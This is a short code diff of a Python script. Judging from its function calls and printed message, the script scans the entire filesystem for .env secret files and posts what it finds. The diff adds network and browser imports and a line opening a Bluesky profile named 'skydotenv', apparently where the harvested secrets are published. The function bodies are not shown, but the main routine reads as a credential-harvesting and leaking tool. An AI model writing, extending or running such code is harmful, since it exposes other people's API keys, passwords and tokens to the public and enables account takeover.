@@ -1,5 +1,7 @@
 import time
 import os
+import requests
+import webbrowser
 
 
 def searchFiles(root, target):
@@ -61,6 +63,8 @@ def main():
                         time.sleep(1)
                     print("Scanning and posting...")
                     postTheThingy(epsteinFiles(searchFiles("/", ".env")))
+                    webbrowser.open("https://bsky.app/profile/skydotenv.bsky.social")
+
 
 if __name__ == "__main__":
     main()
